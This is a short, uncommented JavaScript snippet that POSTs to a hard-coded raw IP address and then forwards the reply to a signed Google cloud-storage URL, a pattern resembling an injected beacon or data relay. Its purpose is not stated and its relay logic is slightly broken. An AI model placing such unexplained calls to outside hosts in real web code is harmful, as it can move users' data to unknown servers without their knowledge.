var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://46.101.175.208/#code', false);
xhr.send();
if (xhr.status != 200) {
  alert( xhr.status + ': ' + xhr.statusText ); 
} else {
	xhr.open('POST', 'https://00e9e64bac89ee5b5495966036500aa1fa1e0e91ee64ff8542-apidata.googleusercontent.com/download/storage/v1_internal/b/web-317/o/result.js?qk=AD5uMEt72Vlnc9IdOgA1t2cQlXO2K_ag9ws7ftyY7vCdJ0IV9FlLArJDRg-tQrWniQ1aRYv7ljGpZtUvYX6k6B4A34ZzXaSnP9teIFJjUUHewTVM8hOmTGoZ6dSRWAL3WREYMaiaah6ql4St_QdpB1pBGTiVDQiH_vh3p7ak_apyrIfWifEURatMR9O-LZB-tQ-n4haRxbydAbnFDDCZleZeZNrpYr0AyX84itj9iMetoyrzBHc8Xyu2UQMG4xRdb50my7gumD_VfPNkXA9u8AX9dTdaCw_CO0hPQyzVxODwg8KNCEonSZlgWEd3IIsKQFq7SJjmQn8m4-mW3gfEWoeKPx4w0QdB9A7zwXtwNKlESLl4RQFycEriIPERoX1j9HQDS6dWl5_IgBcEqlsTV-7QE-YGtgjjnUfoKExLqTYRzfwA-nU-ORTauhNcIaCobsLu2Q3rBlFA3ZqFlrVmM4EmMsIsn5oQw8HTFo-PXZ6olORgmVDRLE9M8TTPYJkTYDKnlyHpi46K8ZWK17rK0H7NibdDFykq2EmJ4pfUIpB85eNtTmEo8TzslS3JixAEXF7POhHnOBGALB_BeHVzDOuj2ohmPCbvQOpvr4MjSdl7Exk7h3O5L8CMwWpiehNwlG_8mN_EG66_MJQ842d-8Mv6ORTCCSY_fhWaDPxiRI4RDkz2NXWXYSF4PfMgW6KOflqD8ZzKSj5N-GPuRYhtxZjzGwT_1wX4iIeSZzpRJvAihCFZV-k6AkzxXkM93wN5CQ7EyPx06kISc8VWF1bimUtMLg-0jSIUgfiTZ0OVffN_zihT90UIgEI', false);
	xhr.send(xhr.responseText);
}